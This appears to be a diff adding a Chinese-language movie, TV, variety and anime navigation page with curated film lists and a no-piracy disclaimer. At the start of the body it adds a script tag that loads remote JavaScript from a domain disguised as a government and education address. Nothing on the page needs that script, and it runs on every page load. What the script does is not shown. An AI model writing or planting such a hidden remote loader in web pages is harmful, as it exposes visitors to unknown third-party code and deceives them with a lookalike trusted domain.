@@ -1,0 +1,282 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>秋霞电影网官网 - 电影/电视剧/综艺/动漫导航与高清片单</title>
+<meta name="description" content="秋霞电影网官网整理电影、热播电视剧、综艺、动漫与经典珍藏片单，晚霞时分遇见好电影。移动端自适应影视导航站，提供分类、评分、年份与观影场景建议。">
+<meta name="keywords" content="秋霞电影网官网,秋霞电影网,电影导航,热播电视剧,综艺动漫,经典电影片单,qiuxiadianyingwangguanwang-h5">
+<style>
+:root{
+  --bg:#1a120f;
+  --panel:#241a16;
+  --panel2:#2e211b;
+  --line:#4a332a;
+  --sun:#ff8a3d;
+  --rose:#ff5e7a;
+  --dusk:#9b6cff;
+  --cream:#f6e7d3;
+  --muted:#c2a892;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  background:
+    radial-gradient(900px 320px at 85% -10%, rgba(255,138,61,.20), transparent),
+    radial-gradient(700px 280px at 0% 0%, rgba(155,108,255,.16), transparent),
+    var(--bg);
+  color:var(--cream);
+  font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;
+  font-size:16px;line-height:1.78;
+}
+a{color:var(--sun);text-decoration:none}
+
+/* 顶栏 */
+.topbar{
+  position:sticky;top:0;z-index:60;
+  background:rgba(26,18,15,.9);
+  border-bottom:1px solid var(--line);
+  backdrop-filter:blur(8px);
+}
+.topbar__row{
+  max-width:1180px;margin:0 auto;padding:.85rem 1rem;
+  display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:.6rem;
+}
+.brand{font-size:1.3rem;font-weight:900;color:#fff;display:flex;align-items:center;gap:.55rem}
+.brand__mark{
+  width:34px;height:34px;border-radius:50%;
+  background:linear-gradient(135deg,var(--sun),var(--rose));
+  display:flex;align-items:center;justify-content:center;font-size:1.1rem;
+}
+.brand b{color:var(--sun)}
+.brand small{display:block;font-size:.66rem;color:var(--muted);font-weight:500;letter-spacing:.5px}
+.menu{display:flex;gap:.4rem;flex-wrap:wrap}
+.menu a{
+  padding:.4rem .82rem;border-radius:999px;font-size:.85rem;
+  background:var(--panel);border:1px solid var(--line);color:var(--muted);
+}
+.menu a:hover{color:#fff;border-color:var(--sun);background:rgba(255,138,61,.14)}
+
+/* Hero */
+.hero{
+  max-width:1180px;margin:0 auto;padding:3.2rem 1rem 2rem;
+  display:grid;grid-template-columns:1.25fr .75fr;gap:2rem;align-items:center;
+}
+.hero h1{font-size:2.25rem;line-height:1.25;margin-bottom:1rem}
+.hero h1 em{color:var(--rose);font-style:normal}
+.hero p{color:var(--muted);margin-bottom:1.5rem}
+.btn{
+  display:inline-block;padding:.75rem 1.8rem;border-radius:999px;font-weight:800;
+  background:linear-gradient(90deg,var(--sun),var(--rose));color:#241208;
+}
+.sunset{
+  height:220px;border-radius:20px;
+  background:linear-gradient(180deg,#ff8a3d 0%,#ff5e7a 45%,#9b6cff 100%);
+  position:relative;overflow:hidden;
+  box-shadow:inset 0 0 60px rgba(0,0,0,.25);
+}
+.sunset::before{
+  content:"";position:absolute;left:50%;top:38%;transform:translateX(-50%);
+  width:90px;height:90px;border-radius:50%;background:#ffe7b0;
+  box-shadow:0 0 40px #ffd27a;
+}
+.sunset::after{
+  content:"晚霞放映中";position:absolute;bottom:12px;left:14px;
+  font-size:.8rem;color:#fff;opacity:.9;
+}
+
+/* 区块 */
+.section{max-width:1180px;margin:0 auto;padding:2.6rem 1rem}
+.h2{
+  font-size:1.5rem;margin-bottom:1.4rem;color:var(--cream);
+  display:flex;align-items:center;gap:.6rem;
+}
+.h2 i{width:10px;height:22px;border-radius:4px;background:linear-gradient(var(--sun),var(--rose));display:inline-block}
+
+/* 电影馆：藏书卡 */
+.shelf{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.1rem}
+.book{
+  background:linear-gradient(160deg,var(--panel),var(--panel2));
+  border:1px solid var(--line);border-radius:16px;padding:1.1rem;position:relative;
+}
+.book__no{
+  position:absolute;top:12px;right:12px;font-size:.72rem;color:var(--bg);
+  background:var(--sun);padding:.15rem .5rem;border-radius:6px;font-weight:800;
+}
+.book__cv{
+  height:120px;border-radius:12px;margin-bottom:.8rem;
+  display:flex;align-items:center;justify-content:center;font-size:2.6rem;color:#fff;
+  background:linear-gradient(135deg,#5a3a2a,#7a4b6b);
+}
+.book h3{font-size:1rem;margin-bottom:.25rem}
+.book p{font-size:.82rem;color:var(--muted)}
+.book span{font-size:.78rem;color:var(--rose)}
+
+/* 电视剧：横带 */
+.series{display:flex;flex-direction:column;gap:.8rem}
+.row{
+  display:grid;grid-template-columns:110px 1fr auto;gap:1rem;align-items:center;
+  background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:.8rem .9rem;
+}
+.row__cv{
+  height:74px;border-radius:10px;display:flex;align-items:center;justify-content:center;
+  font-size:1.8rem;color:#fff;background:linear-gradient(135deg,var(--dusk),#5a3a6b);
+}
+.row h3{font-size:1rem}
+.row p{font-size:.8rem;color:var(--muted)}
+.row b{color:var(--sun);font-size:.85rem}
+
+/* 综艺动漫：双栏 */
+.duo{display:grid;grid-template-columns:1fr 1fr;gap:1.1rem}
+.col{background:var(--panel);border:1px solid var(--line);border-radius:16px;padding:1.1rem}
+.col h3.col__t{font-size:1.05rem;margin-bottom:.8rem;color:var(--sun)}
+.chip-row{display:flex;flex-wrap:wrap;gap:.5rem}
+.chip{
+  padding:.45rem .8rem;border-radius:999px;font-size:.82rem;
+  background:var(--panel2);border:1px solid var(--line);color:var(--cream);
+}
+.chip b{color:var(--rose)}
+
+/* 秋日片单：时间线 */
+.autumn{border-left:2px dashed var(--line);padding-left:1.1rem;display:flex;flex-direction:column;gap:1rem}
+.leaf{
+  background:var(--panel);border:1px solid var(--line);border-radius:14px;padding:.9rem 1rem;position:relative;
+}
+.leaf::before{
+  content:"";position:absolute;left:-1.5rem;top:1.1rem;width:12px;height:12px;border-radius:50%;
+  background:var(--sun);box-shadow:0 0 8px var(--sun);
+}
+.leaf h3{font-size:1rem;margin-bottom:.25rem}
+.leaf p{font-size:.84rem;color:var(--muted)}
+
+/* 声明 */
+.note{
+  background:linear-gradient(135deg,#241a16,#2e1830);
+  border:1px solid var(--line);border-radius:20px;padding:1.8rem;
+}
+.note h2{color:var(--sun);margin-bottom:.8rem}
+.note p{color:var(--muted);margin-bottom:.5rem}
+.note code{background:#000;padding:.2rem .5rem;border-radius:8px;color:var(--sun)}
+
+/* 底部 */
+.foot{
+  text-align:center;padding:2rem 1rem;color:var(--muted);font-size:.82rem;
+  border-top:1px solid var(--line);margin-top:2rem;
+}
+
+/* 移动端 */
+@media (max-width:768px){
+  .hero{grid-template-columns:1fr;text-align:center}
+  .sunset{order:-1;height:170px}
+  .duo{grid-template-columns:1fr}
+  .row{grid-template-columns:84px 1fr;grid-template-areas:"cv title" "cv meta";row-gap:.2rem}
+  .row__cv{grid-area:cv;height:64px;font-size:1.5rem}
+  .row h3{grid-area:title}
+  .row p{grid-area:meta}
+  .row b{display:none}
+  .menu{justify-content:center}
+  h1{font-size:1.8rem!important}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="topbar">
+  <div class="topbar__row">
+    <div class="brand">
+      <div class="brand__mark">🍁</div>
+      <div>秋霞电影网<b>官网</b><small>qiuxiadianyingwangguanwang-h5.github.io</small></div>
+    </div>
+    <nav class="menu">
+      <a href="#">首页</a>
+      <a href="#movie">电影馆</a>
+      <a href="#tv">电视剧集</a>
+      <a href="#show">综艺动漫</a>
+      <a href="#autumn">秋日片单</a>
+      <a href="#note">官网声明</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div>
+    <h1>晚霞时分，<br>遇见<em>好电影</em> 🍂</h1>
+    <p>秋霞电影网官网：电影、热播剧、综艺、动漫与经典珍藏片单，按心情和场景挑片，手机刷起来很舒服。</p>
+    <a href="#" class="btn">打开片单</a>
+  </div>
+  <div class="sunset" aria-label="晚霞放映"></div>
+</section>
+
+<section class="section" id="movie">
+  <h2 class="h2"><i></i> 电影馆</h2>
+  <div class="shelf">
+    <article class="book"><div class="book__no">No.01</div><div class="book__cv">🎬</div><div><h3>流浪地球2</h3><p>2023 · 科幻/灾难</p><span>★ 8.3</span></div></article>
+    <article class="book"><div class="book__no">No.02</div><div class="book__cv">🕊️</div><div><h3>奥本海默</h3><p>2023 · 传记/历史</p><span>★ 8.8</span></div></article>
+    <article class="book"><div class="book__no">No.03</div><div class="book__cv">🐉</div><div><h3>霸王别姬</h3><p>1993 · 剧情/经典</p><span>★ 9.4</span></div></article>
+    <article class="book"><div class="book__no">No.04</div><div class="book__cv">🌌</div><div><h3>星际穿越</h3><p>2014 · 科幻/亲情</p><span>★ 9.0</span></div></article>
+  </div>
+</section>
+
+<section class="section" id="tv">
+  <h2 class="h2"><i></i> 电视剧集</h2>
+  <div class="series">
+    <div class="row"><div class="row__cv">📺</div><div><h3>漫长的季节</h3><p>2023 · 悬疑/生活流 · 12集</p></div><b>9.0</b></div>
+    <div class="row"><div class="row__cv">🥟</div><div><h3>繁花</h3><p>2023 · 剧情/沪上风情 · 30集</p></div><b>8.1</b></div>
+    <div class="row"><div class="row__cv">🔥</div><div><h3>狂飙</h3><p>2023 · 犯罪/扫黑 · 39集</p></div><b>8.5</b></div>
+    <div class="row"><div class="row__cv">🚀</div><div><h3>三体</h3><p>2023 · 科幻/改编 · 30集</p></div><b>8.1</b></div>
+  </div>
+</section>
+
+<section class="section" id="show">
+  <h2 class="h2"><i></i> 综艺 & 动漫</h2>
+  <div class="duo">
+    <div class="col">
+      <h3 class="col__t">🎤 综艺热播</h3>
+      <div class="chip-row">
+        <span class="chip">极限挑战 <b>热</b></span>
+        <span class="chip">王牌对王牌</span>
+        <span class="chip">脱口秀大会 <b>新</b></span>
+        <span class="chip">向往的生活</span>
+        <span class="chip">乘风2026</span>
+      </div>
+    </div>
+    <div class="col">
+      <h3 class="col__t">🌸 动漫精选</h3>
+      <div class="chip-row">
+        <span class="chip">夏目友人帐 <b>治愈</b></span>
+        <span class="chip">一人之下</span>
+        <span class="chip">雾山五行</span>
+        <span class="chip">斗罗大陆2</span>
+        <span class="chip">虫师</span>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section class="section" id="autumn">
+  <h2 class="h2"><i></i> 秋日片单</h2>
+  <div class="autumn">
+    <div class="leaf"><h3>傍晚一个人看</h3><p>《海街日记》《小森林》《人生果实》——慢节奏、不费脑、适合窗边。</p></div>
+    <div class="leaf"><h3>周末和对象看</h3><p>《爱在黎明破晓前》《怦然心动》《时空恋旅人》——聊天比剧情多也没关系。</p></div>
+    <div class="leaf"><h3>深夜补经典</h3><p>《肖申克的救赎》《阿甘正传》《美丽人生》——老片经得住重看。</p></div>
+    <div class="leaf"><h3>秋天想哭一场</h3><p>《情书》《海上钢琴师》《入殓师》——纸巾备好，别开弹幕。</p></div>
+  </div>
+</section>
+
+<section class="section" id="note">
+  <div class="note">
+    <h2>官网声明</h2>
+    <p>秋霞电影网官网为影视分类导航与片单整理站，提供电影/剧集/综艺/动漫的分类、评分、年份与观影场景建议。</p>
+    <p>网址：<code>https://qiuxiadianyingwangguanwang-h5.github.io</code></p>
+    <p>本站不提供盗版播放与下载；正式观看请使用正版影视平台，资源版权归原权利人所有。</p>
+    <a href="#" class="btn">收藏官网</a>
+  </div>
+</section>
+
+<footer class="foot">
+  © 2024 秋霞电影网官网 ｜ qiuxiadianyingwangguanwang-h5.github.io ｜ 晚霞光影 / 移动端自适应单页
+</footer>
+
+</body>
+</html>
